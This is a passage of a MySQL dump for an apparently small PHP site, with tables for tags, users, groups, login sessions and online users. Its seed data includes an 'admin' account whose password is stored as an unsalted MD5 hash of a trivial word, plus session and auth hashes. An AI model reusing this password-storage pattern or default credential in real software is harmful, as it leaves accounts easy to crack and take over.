# Structure for the `tags_tagCoords` table : 
#

DROP TABLE IF EXISTS `tags_tagCoords`;

CREATE TABLE `tags_tagCoords` (
  `rel_id` INTEGER(10) UNSIGNED NOT NULL,
  `x` INTEGER(11) NOT NULL,
  `y` INTEGER(11) NOT NULL,
  `w` INTEGER(11) NOT NULL,
  `h` INTEGER(11) NOT NULL,
  PRIMARY KEY (`rel_id`)
)ENGINE=MyISAM
ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Structure for the `tags_tags` table : 
#

DROP TABLE IF EXISTS `tags_tags`;

CREATE TABLE `tags_tags` (
  `id` INTEGER(10) UNSIGNED NOT NULL AUTO_INCREMENT,
  `tag` VARCHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  `obj_id` INTEGER(10) UNSIGNED DEFAULT NULL,
  PRIMARY KEY (`id`)
)ENGINE=MyISAM
AUTO_INCREMENT=1 CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Structure for the `tags_tagsItem` table : 
#

DROP TABLE IF EXISTS `tags_tagsItem`;

CREATE TABLE `tags_tagsItem` (
  `id` INTEGER(10) UNSIGNED NOT NULL AUTO_INCREMENT,
  `item_obj_id` INTEGER(10) UNSIGNED DEFAULT NULL,
  `obj_id` INTEGER(10) UNSIGNED DEFAULT NULL,
  `owner` INTEGER(10) UNSIGNED DEFAULT NULL,
  PRIMARY KEY (`id`)
)ENGINE=MyISAM
AUTO_INCREMENT=1 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Structure for the `user_group` table : 
#

DROP TABLE IF EXISTS `user_group`;

CREATE TABLE `user_group` (
  `id` INTEGER(11) NOT NULL AUTO_INCREMENT,
  `obj_id` INTEGER(10) UNSIGNED NOT NULL DEFAULT '0',
  `name` CHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  `is_default` TINYINT(4) DEFAULT NULL,
  PRIMARY KEY (`id`)
)ENGINE=MyISAM
AUTO_INCREMENT=5 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `user_group` table  (LIMIT 0,500)
#

INSERT INTO `user_group` (`id`, `obj_id`, `name`, `is_default`) VALUES 
  (1,14,'unauth',NULL),
  (2,15,'auth',1),
  (3,16,'root',0),
  (4,824,'moderators',0);
COMMIT;

#
# Structure for the `user_user` table : 
#

DROP TABLE IF EXISTS `user_user`;

CREATE TABLE `user_user` (
  `id` INTEGER(11) NOT NULL AUTO_INCREMENT,
  `obj_id` INTEGER(10) UNSIGNED NOT NULL DEFAULT '0',
  `login` VARCHAR(255) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `password` VARCHAR(32) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `created` INTEGER(11) DEFAULT NULL,
  `confirmed` VARCHAR(32) COLLATE utf8_general_ci DEFAULT NULL,
  `last_login` INTEGER(11) DEFAULT NULL,
  `language_id` INTEGER(11) DEFAULT NULL,
  `timezone` INTEGER(11) DEFAULT '3',
  `skin` INTEGER(11) UNSIGNED DEFAULT '1',
  PRIMARY KEY (`id`),
  KEY `login` (`login`)
)ENGINE=MyISAM
AUTO_INCREMENT=7 CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `user_user` table  (LIMIT 0,500)
#

INSERT INTO `user_user` (`id`, `obj_id`, `login`, `password`, `created`, `confirmed`, `last_login`, `language_id`, `timezone`, `skin`) VALUES 
  (1,17,'guest','',NULL,NULL,1227260702,NULL,3,1),
  (2,18,'admin','098f6bcd4621d373cade4e832627b4f6',NULL,NULL,1236857578,1,3,1);
COMMIT;

#
# Structure for the `user_userAuth` table : 
#

DROP TABLE IF EXISTS `user_userAuth`;

CREATE TABLE `user_userAuth` (
  `id` INTEGER(11) UNSIGNED NOT NULL AUTO_INCREMENT,
  `user_id` INTEGER(11) UNSIGNED DEFAULT NULL,
  `ip` CHAR(15) COLLATE utf8_general_ci DEFAULT NULL,
  `hash` CHAR(32) COLLATE utf8_general_ci DEFAULT NULL,
  `obj_id` INTEGER(11) UNSIGNED DEFAULT NULL,
  `time` INTEGER(11) UNSIGNED DEFAULT NULL,
  PRIMARY KEY (`id`)
)ENGINE=MyISAM
AUTO_INCREMENT=21 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `user_userAuth` table  (LIMIT 0,500)
#

INSERT INTO `user_userAuth` (`id`, `user_id`, `ip`, `hash`, `obj_id`, `time`) VALUES 
  (18,2,'127.0.0.1','7b09d65a85d679fe4e424268c8a10fdc',NULL,1237549873),
  (19,2,'127.0.0.1','c3e234c16087ca58d9ce0a2057c402bd',NULL,NULL),
  (20,2,'127.0.0.1','0bc8b5fc0900dcf33ba30f876929b531',NULL,NULL);
COMMIT;

#
# Structure for the `user_userGroup_rel` table : 
#

DROP TABLE IF EXISTS `user_userGroup_rel`;

CREATE TABLE `user_userGroup_rel` (
  `id` INTEGER(11) NOT NULL AUTO_INCREMENT,
  `group_id` INTEGER(11) DEFAULT NULL,
  `user_id` INTEGER(11) DEFAULT NULL,
  `obj_id` INTEGER(11) UNSIGNED DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `group_id` (`group_id`, `user_id`),
  KEY `user_id` (`user_id`)
)ENGINE=MyISAM
AUTO_INCREMENT=39 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `user_userGroup_rel` table  (LIMIT 0,500)
#

INSERT INTO `user_userGroup_rel` (`id`, `group_id`, `user_id`, `obj_id`) VALUES 
  (1,1,1,19),
  (23,2,2,20),
  (24,3,2,21),
  (31,2,4,780),
  (33,2,5,783),
  (35,4,5,825),
  (36,4,4,826),
  (37,2,6,975),
  (38,4,6,976);
COMMIT;

#
# Structure for the `user_userOnline` table : 
#

DROP TABLE IF EXISTS `user_userOnline`;

CREATE TABLE `user_userOnline` (
  `id` INTEGER(11) UNSIGNED NOT NULL AUTO_INCREMENT,
  `user_id` INTEGER(11) DEFAULT NULL,
  `session` CHAR(32) COLLATE utf8_general_ci DEFAULT NULL,
  `last_activity` INTEGER(11) DEFAULT NULL,
  `url` CHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  `ip` CHAR(15) COLLATE utf8_general_ci DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `user_id` (`user_id`, `session`),
  KEY `last_activity` (`last_activity`)
)ENGINE=MyISAM
AUTO_INCREMENT=377 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `user_userOnline` table  (LIMIT 0,500)
#

INSERT INTO `user_userOnline` (`id`, `user_id`, `session`, `last_activity`, `url`, `ip`) VALUES 
  (376,2,'093f5a031e5859f82bbc8b5158ad0750',1227261708,'http://govnokod/admin/user/admin','127.0.0.1');
COMMIT;



/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;